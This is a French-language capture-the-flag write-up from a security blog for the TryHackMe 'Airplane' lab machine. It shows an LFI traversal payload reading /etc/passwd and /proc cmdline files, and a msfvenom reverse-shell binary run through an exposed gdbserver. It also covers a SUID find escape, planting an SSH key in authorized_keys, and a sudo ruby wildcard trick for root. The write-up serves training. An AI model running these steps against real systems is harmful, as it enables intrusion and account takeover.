@@ -1,0 +1,178 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Airplane</title>
+<meta name=description content="Platforme: TryHackMe Lien: Airplane Niveau: Moyen OS: Linux Airplane débute par la découverte d&amp;rsquo;une vulnérabilité de type Local File Inclusion (LFI). En …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-airplane/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Airplane"><meta property="og:description" content="Platforme: TryHackMe Lien: Airplane Niveau: Moyen OS: Linux Airplane débute par la découverte d&amp;rsquo;une vulnérabilité de type Local File Inclusion (LFI). En …"><meta property="og:image" content="https://scorpiosec.com/images/THM-Airplane/Airplane.svg"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-Airplane/Airplane.svg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Airplane"><meta name=twitter:description content="Platforme: TryHackMe Lien: Airplane Niveau: Moyen OS: Linux Airplane débute par la découverte d&amp;rsquo;une vulnérabilité de type Local File Inclusion (LFI). En …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-airplane/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-airplane/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-Airplane/Airplane.svg"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-airplane/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-airplane/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Airplane</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
+<span class=post-date>11 Décembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/r/room/airplane>Airplane</a></li><li>Niveau: Moyen</li><li>OS: Linux</li></ul><hr><p>Airplane débute par la découverte d&rsquo;une vulnérabilité de type Local File Inclusion (LFI). En l&rsquo;exploitant, nous énumérons les processus en cours d&rsquo;exécution sur la cible et identifions un processus lié à <code>GdbServer</code>. Grâce à un binaire ELF conçu avec msfvenom, nous exploitons cet outil pour obtenir un accès initial au système. Une énumération plus approfondie révèle un binaire avec le bit SUID activé, ce qui nous permet de pivoter vers un autre compte et de récupérer le drapeau utilisateur. Nous accédons ensuite au système via SSH en tant que ce nouvel utilisateur et découvrons la permission d&rsquo;exécuter des scripts Ruby en tant que root. En créant et en exécutant notre propre script Ruby, nous élevons nos privilèges et obtenons l&rsquo;accès au compte root.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.14.32 Airplane
+</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,6048,8000
+</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-12-11 17:48 CST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.14.32
+</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.21s latency<span style=color:#56b6c2>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE  VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>6048/tcp open  x11?
+</span></span><span style=display:flex><span>8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://airplane.thm:8000/?page<span style=color:#56b6c2>=</span>index.html
+</span></span><span style=display:flex><span>| fingerprint-strings: 
+</span></span><span style=display:flex><span>|   FourOhFourRequest: 
+</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>404</span> NOT FOUND
+</span></span><span style=display:flex><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style=display:flex><span>|     Date: Wed, <span style=color:#d19a66>11</span> Dec <span style=color:#d19a66>2024</span> 23:48:23 GMT
+</span></span><span style=display:flex><span>|     Content-Type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
+</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d19a66>207</span>
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
+</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span>en&gt;
+</span></span><span style=display:flex><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style=display:flex><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span style=display:flex><span>|   GetRequest: 
+</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>302</span> FOUND
+</span></span><span style=display:flex><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style=display:flex><span>|     Date: Wed, <span style=color:#d19a66>11</span> Dec <span style=color:#d19a66>2024</span> 23:48:17 GMT
+</span></span><span style=display:flex><span>|     Content-Type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
+</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d19a66>269</span>
+</span></span><span style=display:flex><span>|     Location: http://airplane.thm:8000/?page<span style=color:#56b6c2>=</span>index.html
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
+</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span>en&gt;
+</span></span><span style=display:flex><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style=display:flex><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;http://airplane.thm:8000/?page=index.html&#34;</span>&gt;http://airplane.thm:8000/?page<span style=color:#56b6c2>=</span>index.html&lt;/a&gt;. If not, click the link.
+</span></span><span style=display:flex><span>|   Socks5: 
+</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style=display:flex><span>|     <span style=color:#98c379>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;html&gt;
+</span></span><span style=display:flex><span>|     &lt;head&gt;
+</span></span><span style=display:flex><span>|     &lt;meta http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Content-Type&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style=display:flex><span>|     &lt;/head&gt;
+</span></span><span style=display:flex><span>|     &lt;body&gt;
+</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request syntax <span style=color:#56b6c2>(</span><span style=color:#98c379>&#39;
+</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &#39;</span><span style=color:#56b6c2>)</span>.&lt;/p&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style=display:flex><span>|     &lt;/body&gt;
+</span></span><span style=display:flex><span>|_    &lt;/html&gt;
+</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port8000-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>12/11%Time<span style=color:#56b6c2>=</span>675A24C2%P<span style=color:#56b6c2>=</span>x86_64-pc-linux-gnu%
+</span></span><span style=display:flex><span>SF:r<span style=color:#56b6c2>(</span>GetRequest,1F3,<span style=color:#98c379>&#34;HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2023:48:1
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:7\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:gth:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.htm
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:l\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:n&lt;title&gt;Redirecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x2
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0URL:\x20&lt;a\x20href=\&#34;http://airplane\.thm:8000/\?page=index\.html\&#34;&gt;ht
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tp://airplane\.thm:8000/\?page=index\.html&lt;/a&gt;\.\x20If\x20not,\x20click
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20the\x20link\.\n&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>FourOhFourRequest,184,<span style=color:#98c379>&#34;HTTP/1\.1\x20404\x20NOT\
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:Wed,\x2011\x20Dec\x202024\x2023:48:23\x20GMT\r\nContent-Type:\x20text/h
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Fou
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:nd&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x2
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20again\.&lt;/p&gt;\n&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>Socks5,213,<span style=color:#98c379>&#34;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\&#34;http:/
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:/www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x2
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;/p&gt;\n\x20\x20\x2
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BA
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
+</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:od\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style=color:#56b6c2>)</span>;
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 181.28 seconds
+</span></span></code></pre></div><p>Notre scan nmap trouve trois ports ouverts :</p><ul><li>22 - SSH</li><li>6048 - nmap n&rsquo;est pas en mesure de déterminer avec précision le service sur ce port</li><li>8000 - Un serveur web avec Python Werkzeug. Nous avons aussi une redirection vers <code>airplane.thm</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</li></ul><h2 id=enumération>Enumération</h2><p>La navigation vers le site web nous conduit à <code>http://airplane.thm:8000/?page=index.html</code> où nous trouvons un site web avec diverses informations sur les avions. Nous notons également la présence de <code>?page=index.html</code>, ce qui pourrait indiquer une vulnérabilité LFI si les contrôles de sécurité sont insuffisants.</p><p><img src=/images/THM-Airplane/airplane_website.png alt="Airplane website"></p><p>Avec Burp, nous confirmons la présence de la vulnérabilité.</p><p><img src=/images/THM-Airplane/LFI_confirmed.png alt="LFI confirmed"></p><p>Nous pouvons lire le fichier <code>/etc/passwd</code> pour identifier les utilisateurs sur le système cible.</p><p><img src=/images/THM-Airplane/users_list.png alt="user accounts"></p><p>Ci-dessous se trouve le contenu complet du fichier <code>/etc/passwd</code>, nous remarquons deux comptes utilisateurs <code>carlos</code> et <code>hudson</code>.</p><pre tabindex=0><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+whoopsie:x:120:125::/nonexistent:/bin/false
+colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
+sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+hudson:x:1001:1001::/home/hudson:/bin/bash
+sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
+</code></pre><p>Les tentatives de lecture du fichier <code>user.txt</code> dans le dossier personnel de <code>carlos</code> ou <code>hudson</code> échouent.</p><p><img src=/images/THM-Airplane/carlos_home_folder.png alt="carlos Home folder"></p><p><img src=/images/THM-Airplane/hudson_home_folder.png alt="hudson home fodler"></p><p>Nous continuons notre énumération et essayons de trouver des répertoires cachés avec gobuster.</p><p><img src=/images/THM-Airplane/gobuster_cmd.png alt="directory bruteforcing with Gobuster"></p><p>À <code>http://airplane.thm:8000/airplane</code>, nous trouvons une animation avec le message «Let&rsquo;s Fly», ce qui n&rsquo;est probablement pas une voie d&rsquo;exploitation viable. De plus, l&rsquo;énumération des sous-domaines ne donne aucun résultat.</p><p><img src=/images/THM-Airplane/letsfly.png alt="airplane directory"></p><p>Nous pouvons exploiter la vulnérabilité LFI pour trouver des informations sur les processus existant sur la cible. Chaque processus en cours d&rsquo;exécution sur un système Linux a un répertoire correspondant sous le répertoire <code>/proc</code>, et à l&rsquo;intérieur de ce répertoire il y a un fichier nommé <code>cmdline</code>.</p><p>Par exemple, <code>/proc/100/cmdline</code> contiendra les arguments de la ligne de commande qui ont été utilisés pour démarrer le processus avec le PID <code>100</code>. Ces fichiers peuvent contenir des informations sensibles telles que des mots de passe, des clés API, etc.</p><p>Afin d&rsquo;énumérer les processus sur la cible, nous utilisons la fonction Intruder de Burp. Nous utilisons le payload <code>../../../../proc/x/cmdline</code> avec le symbole <code>§</code> autour du <code>x</code>.</p><p><img src=/images/THM-Airplane/payload_intruder.png alt="payload in intruder"></p><p>Pour les paramètres du payload, nous sélectionnons <code>Numbers</code> allant séquentiellement de 1 à 10000 (vous pouvez choisir un nombre plus petit comme 1000) et démarrons l&rsquo;attaque. En raison de la limite de vitesse de Burp CE, le processus prendra beaucoup de temps, mais nous pouvons continuer notre énumération au fur et à mesure que l&rsquo;attaque progresse.</p><blockquote><p>Je recommande d&rsquo;utiliser <a href=https://caido.io/>Caido</a> pour ce type d&rsquo;attaque car il n&rsquo;y a pas de limitation de vitesse.</p></blockquote><p>Après avoir classé les requêtes par longueur, vous trouverez une requête dont la réponse est <code>/usr/bin/gdbserver0.0.0.0:6048airplane</code>. (La requête spécifique se trouve toujours parmi celles qui ont une longueur d&rsquo;environ 400 octets).</p><p><img src=/images/THM-Airplane/gdbserver.png alt="gdbserver process"></p><h2 id=accès-initial-shell-en-tant-que-hudson>Accès initial (shell en tant que hudson)</h2><p>En recherchant <code>gdbserver reverse shell</code> sur Google, nous trouvons <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver>cette page HackTricks</a> expliquant comment exploiter cet outil. Suivons les étapes :</p><ol><li>Créer un binaire ELF</li></ol><pre tabindex=0><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT PrependFork=true -f elf -o binary.elf
+</code></pre><p><img src=/images/THM-Airplane/elf_backdoor.png alt="elf backdoor"></p><ol start=2><li>Rendre le fichier exécutable</li></ol><pre tabindex=0><code>chmod +x binary.elf
+</code></pre><ol start=3><li>Lancer GDB pour débugger le fichier</li></ol><pre tabindex=0><code>gdb binary.elf
+</code></pre><p><img src=/images/THM-Airplane/gdb_elf.png alt="Open the elf with GDB"></p><ol start=4><li>Définir la cible du debugger</li></ol><pre tabindex=0><code>target extended-remote airplane.thm:6048
+</code></pre><p><img src=/images/THM-Airplane/elf_target_set.png alt="Set the remote target"></p><ol start=5><li>Télécharger le fichier ELF sur la cible</li></ol><pre tabindex=0><code>remote put binary.elf /tmp/binary.elf
+</code></pre><p><img src=/images/THM-Airplane/elf_upload.png alt="elf backdoor upload"></p><ol start=6><li>Définir le fichier exécutable</li></ol><pre tabindex=0><code>set remote exec-file /tmp/binary.elf
+</code></pre><ol start=7><li>Exécuter le fichier sur la cible</li></ol><blockquote><p>Assurez-vous que votre listener est configuré sur le numéro de port choisi à l&rsquo;étape 1.</p></blockquote><pre tabindex=0><code>run
+y
+</code></pre><p><img src=/images/THM-Airplane/revshell_executed.png alt="Reverse shell executed"></p><p>Sur le listener, nous recevons une connexion en tant que <code>hudson</code>.</p><p><img src=/images/THM-Airplane/foothold.png alt=Foothold></p><p>Nous améliorons notre shell avec les commandes suivantes</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><p><img src=/images/THM-Airplane/shell_upgrade.png alt="Shell Upgrade"></p><p>Le drapeau utilisateur n&rsquo;est pas sur ce compte, nous devons donc accéder au deuxième compte.</p><h3 id=mouvement-latéral-shell-en-tant-que-carlos>Mouvement latéral (shell en tant que carlos)</h3><p>Nous exécutons linpeas et constatons que <code>/usr/bin/find</code> a le bit SUID défini et qu&rsquo;il appartient à <code>carlos</code>.</p><p><img src=/images/THM-Airplane/find_binary.png alt="find binary with SUID bit set"></p><p>Sur <a href=https://gtfobins.github.io/gtfobins/find/>GTFObins</a>, nous trouvons un payload permettant d&rsquo;élever nos privilèges et le drapeau utilisateur est dans <code>/home/carlos</code>.</p><pre tabindex=0><code>/usr/bin/find . -exec /bin/bash -p \; -quit
+</code></pre><p><img src=/images/THM-Airplane/user_flag.png alt="user flag"></p><p>Avec <code>ls -la</code> nous observons le répertoire <code>.ssh</code>. Nous pouvons ajouter une clé ssh à <code>/home/carlos/.ssh/authorized_keys</code> pour être en mesure de se connecter via SSH en tant que <code>carlos</code>.</p><p>Nous générons une paire de clés avec</p><pre tabindex=0><code>ssh-keygen -t rsa -b 2048 -f carlos
+</code></pre><p><img src=/images/THM-Airplane/keygen_carlos.png alt="SSH keygen"></p><p>Nous stockons le contenu de <code>carlos.pub</code> dans <code>/home/carlos/.ssh/authorized_keys</code> à l&rsquo;aide de</p><pre tabindex=0><code>echo &#39;CONTENT OF carlos.pub&#39; &gt; /home/carlos/.ssh/authorized_keys
+
+chmod 600 /home/carlos/.ssh/authorized_keys
+</code></pre><p><img src=/images/THM-Airplane/SSH_setup.png alt="SSH setup"></p><p>Sur notre machine locale, nous nous connectons sous le nom de Carlos avec</p><pre tabindex=0><code>ssh -i carlos carlos@airplane.thm
+</code></pre><p><img src=/images/THM-Airplane/shh_login_carlos.png alt="SSH login as carlos"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Avec <code>sudo -l</code> nous apprenons que <code>carlos</code> est autorisé à exécuter n&rsquo;importe quel script Ruby situé dans <code>/root</code> en tant que root sans fournir de mot de passe.</p><p><img src=/images/THM-Airplane/sudo-l.png alt="sudo -l command"></p><p>Il est facile d&rsquo;en abuser en créant notre propre fichier ruby contenant une commande pour lancer un shell. De plus, grâce au caractère <code>*</code>, nous pouvons exécuter notre fichier même s&rsquo;il se trouve en dehors de <code>/root</code>.</p><pre tabindex=0><code>echo &#39;exec &#34;/bin/sh&#34;&#39; &gt; root.rb
+
+sudo /usr/bin/ruby /root/../home/carlos/root.rb
